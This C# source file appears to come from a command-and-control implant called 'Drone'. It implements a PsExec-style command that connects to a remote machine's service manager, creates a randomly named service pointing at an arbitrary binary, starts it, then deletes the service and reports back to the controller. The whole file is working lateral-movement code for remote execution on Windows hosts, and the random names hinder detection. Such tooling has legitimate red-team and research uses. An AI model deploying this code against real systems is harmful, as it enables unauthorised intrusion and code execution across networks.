using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class PsExecCommand : DroneCommand
{
    public override byte Command => 0x5E;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // open handle to scm
        var scmHandle = OpenSCManager(
            task.Arguments["target"],
            SCM_ACCESS_RIGHTS.SC_MANAGER_CREATE_SERVICE);

        if (scmHandle == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        if (!task.Arguments.TryGetValue("serviceName", out var serviceName))
            serviceName = Helpers.GenerateRandomString(7);

        if (!task.Arguments.TryGetValue("displayName", out var displayName))
            displayName = Helpers.GenerateRandomString(7);

        // create service
        var svcHandle = CreateService(
            scmHandle,
            serviceName,
            displayName,
            SERVICE_ACCESS_RIGHTS.SERVICE_ALL_ACCESS,
            SERVICE_TYPE.SERVICE_WIN32_OWN_PROCESS,
            START_TYPE.SERVICE_DEMAND_START,
            task.Arguments["binPath"]);

        if (svcHandle == IntPtr.Zero)
        {
            CloseServiceHandle(scmHandle);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // start service
        // this will fail on generic commands, so don't expect a true result
        StartService(svcHandle);

        // little sleep
        Thread.Sleep(3000);
        
        // delete service
        DeleteService(svcHandle);
        
        // close handles
        CloseServiceHandle(svcHandle);
        CloseServiceHandle(scmHandle);

        await Drone.SendTaskComplete(task.Id);
    }
}